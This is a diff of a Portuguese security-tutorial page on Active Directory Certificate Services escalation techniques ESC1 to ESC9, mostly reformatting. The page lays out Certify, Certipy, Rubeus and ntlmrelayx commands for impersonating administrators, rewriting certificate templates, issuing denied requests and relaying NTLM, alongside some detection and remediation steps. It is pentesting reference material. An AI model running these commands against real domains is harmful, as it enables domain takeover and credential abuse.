@@ -1,4 +1,4 @@
-# AD CS Escalation de Domínio
+# AD CS Domain Escalation
 
 <details>
 
@@ -36,26 +36,34 @@ Observe que, quando um certificado com esta última opção é criado, um **avis
 ### Abuso
 
 Para **encontrar modelos de certificado vulneráveis**, você pode executar:
+
 ```bash
 Certify.exe find /vulnerable
 certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
 ```
+
 Para **abusar dessa vulnerabilidade para se passar por um administrador**, pode-se executar:
+
 ```bash
 Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
 certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
 ```
+
 Então, você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticação usando Rubeus ou certipy** novamente:
+
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
+
 Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
 Além disso, a seguinte consulta LDAP, quando executada no esquema de configuração da floresta AD, pode ser usada para **enumerar** **modelos de certificado** que não exigem aprovação/assinaturas, que possuem um EKU de **Autenticação do Cliente ou Logon de Smart Card**, e têm a flag **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** habilitada:
+
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
+
 ## Modelos de Certificado Mal Configurados - ESC2
 
 ### Explicação
@@ -75,9 +83,11 @@ Um **certificado sem EKUs** - um certificado de CA subordinado - também pode se
 No entanto, se o **CA subordinado não for confiável** pelo objeto **`NTAuthCertificates`** (o que não será por padrão), o invasor **não pode criar novos certificados** que funcionem para **autenticação de domínio**. Ainda assim, o invasor pode criar **novos certificados com qualquer EKU** e valores de certificado arbitrários, dos quais há **muitos** que o invasor poderia potencialmente **abusar** (por exemplo, assinatura de código, autenticação de servidor, etc.) e pode ter grandes implicações para outras aplicações na rede, como SAML, AD FS ou IPSec.
 
 A seguinte consulta LDAP, quando executada no esquema de configuração da floresta AD, pode ser usada para enumerar modelos que correspondem a este cenário:
+
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
 ```
+
 ## Modelos de Agente de Inscrição Mal Configurados - ESC3
 
 ### Explicação
@@ -107,6 +117,7 @@ O **"agente de inscrição"** se inscreve em tal **modelo** e usa o **certificad
 ### Abuso
 
 Você pode usar o [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar desse cenário:
+
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
@@ -120,6 +131,7 @@ certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'Us
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
+
 As CAs empresariais podem **restringir** os **usuários** que podem **obter** um **certificado de agente de inscrição**, os modelos de inscrição de agente e em quais **contas** o agente de inscrição pode **agir em nome de** ao abrir `certsrc.msc` `snap-in -> clicando com o botão direito no CA -> clicando em Propriedades -> navegando` até a guia "Agentes de Inscrição".
 
 No entanto, a configuração padrão do CA é "**Não restringir agentes de inscrição**". Mesmo quando os administradores habilitam "Restringir agentes de inscrição", a configuração padrão é extremamente permissiva, permitindo que todos tenham acesso a todos os modelos de inscrição como qualquer pessoa.
@@ -153,6 +165,7 @@ Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas n
 <figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Certipy** pode sobrescrever a configuração de um modelo de certificado com um único comando. Por **padrão**, o Certipy irá **sobrescrever** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o parâmetro **`-save-old` para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.
+
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -163,6 +176,7 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
+
 ## Controle de Acesso de Objeto PKI Vulnerável - ESC5
 
 ### Explicação
@@ -187,14 +201,19 @@ Isso significa que um **atacante** pode se inscrever em **QUALQUER modelo** conf
 ### Abuso
 
 As organizações podem **verificar se a configuração está habilitada** usando o seguinte comando `certutil.exe`:
+
 ```bash
 certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 ```
+
 Abaixo, isso usa apenas o **registro remoto**, então o seguinte comando também pode funcionar:
+
 ```
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags 
 ```
+
 [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) também verificam isso e podem ser usados para abusar dessa má configuração:
+
 ```bash
 # Check for vulns, including this one
 Certify.exe find
@@ -203,14 +222,19 @@ Certify.exe find
 Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 ```
+
 Essas configurações podem ser **definidas**, assumindo direitos **administrativos de domínio** (ou equivalentes), a partir de qualquer sistema:
+
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
+
 Se você encontrar essa configuração em seu ambiente, você pode **remover esta flag** com:
+
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
+
 {% hint style="warning" %}
 Após as atualizações de segurança de maio de 2022, novos **certificados** terão uma **extensão de segurança** que **incorpora** a propriedade **`objectSid` do solicitante**. Para ESC1, essa propriedade será refletida a partir do SAN especificado, mas com **ESC6**, essa propriedade reflete o **`objectSid` do solicitante**, e não do SAN.\
 Portanto, **para abusar do ESC6**, o ambiente deve ser **vulnerável ao ESC10** (Mapeamentos de Certificado Fracos), onde o **SAN é preferido sobre a nova extensão de segurança**.
@@ -227,9 +251,11 @@ Uma autoridade de certificação em si tem um **conjunto de permissões** que se
 <figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>
 
 Isso também pode ser enumerado via [**módulo PSPKI**](https://www.pkisolutions.com/tools/pspki/) com `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
+
 ```bash
 Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
 ```
+
 Os dois principais direitos aqui são o direito **`ManageCA`** e o direito **`ManageCertificates`**, que se traduzem em "administrador de CA" e "gerenciador de certificados".
 
 #### Abuso
@@ -245,6 +271,7 @@ Isso também é possível de forma mais simples com o cmdlet [**Enable-PolicyMod
 O direito **`ManageCertificates`** permite **aprovar uma solicitação pendente**, portanto, ignorando a proteção "aprovação do gerente de certificados da CA".
 
 Você pode usar uma **combinação** do módulo **Certify** e **PSPKI** para solicitar um certificado, aprová-lo e baixá-lo:
+
 ```powershell
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
@@ -260,6 +287,7 @@ Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest 
 # Download the certificate
 Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
 ```
+
 ### Ataque 2
 
 #### Explicação
@@ -281,13 +309,16 @@ A técnica se baseia no fato de que usuários com o direito de acesso `Manage CA
 #### Abuso
 
 Você pode **conceder a si mesmo o direito de acesso `Manage Certificates`** adicionando seu usuário como um novo oficial.
+
 ```bash
 certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully added officer 'John' on 'corp-DC-CA'
 ```
+
 O modelo **`SubCA`** pode ser **habilitado no CA** com o parâmetro `-enable-template`. Por padrão, o modelo `SubCA` está habilitado.
+
 ```bash
 # List templates
 certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
@@ -299,9 +330,11 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
+
 Se já cumprimos os pré-requisitos para este ataque, podemos começar **solicitando um certificado com base no modelo `SubCA`**.
 
 **Essa solicitação será negada**, mas salvaremos a chave privada e anotaremos o ID da solicitação.
+
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -313,14 +346,18 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
+
 Com o nosso **`Gerenciar CA` e `Gerenciar Certificados`**, podemos então **emitir o certificado falho** com o comando `ca` e o parâmetro `-issue-request <ID do pedido>`.
+
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
+
 E finalmente, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <ID do pedido>`.
+
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -332,6 +369,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '785.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
+
 ## NTLM Relay para endpoints HTTP do AD CS - ESC8
 
 ### Explicação
@@ -361,24 +399,28 @@ Outra limitação dos ataques de relé NTLM é que eles **exigem que uma conta d
 
 ### **Abuso**
 
-O comando `cas` do **Certify** pode enumerar os **endpoints HTTP do AD CS habilitados**: 
+O comando `cas` do **Certify** pode enumerar os **endpoints HTTP do AD CS habilitados**:
 
 [**Certify**](https://github.com/GhostPack/Certify)
+
 ```
 Certify.exe cas
 ```
+
 As Autoridades de Certificação Empresariais também armazenam os pontos de extremidade CES em seus objetos AD na propriedade `msPKI-Enrollment-Servers`. O **Certutil.exe** e o **PSPKI** podem analisar e listar esses pontos de extremidade:
+
 ```
 certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
 ```
-<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption>Figura: Exemplo de um certificado de domínio do Active Directory</figcaption></figure>
-```powershell
-Import-Module PSPKI
-Get-CertificationAuthority | select Name,Enroll* | Format-List *
-```
+
+<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption><p>Figura: Exemplo de um certificado de domínio do Active Directory</p></figcaption></figure>
+
+\`\`\`powershell Import-Module PSPKI Get-CertificationAuthority | select Name,Enroll\* | Format-List \* \`\`\`
+
 <figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 #### Abuso com Certify
+
 ```bash
 ## In the victim machine
 # Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
@@ -393,11 +435,13 @@ proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2sup
 # Force authentication from victim to compromised machine with port forwards
 execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
 ```
+
 #### Abuso com [Certipy](https://github.com/ly4k/Certipy)
 
 Por padrão, o Certipy solicitará um certificado com base no modelo `Máquina` ou `Usuário`, dependendo se o nome da conta transmitida termina com `$`. É possível especificar outro modelo com o parâmetro `-template`.
 
 Podemos então usar uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para coagir a autenticação. Para controladores de domínio, devemos especificar `-template DomainController`.
+
 ```
 $ certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -410,6 +454,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
+
 ## Extensão de Segurança Desativada - ESC9 <a href="#5485" id="5485"></a>
 
 ### Explicação
@@ -427,7 +472,7 @@ Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local`, e quer
 
 Primeiro, obtemos o hash de `Jane` com, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).
 
-<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>
 
 Em seguida, alteramos o `userPrincipalName` de `Jane` para ser `Administrator`. Observe que estamos deixando de fora a parte `@corp.local`.
 
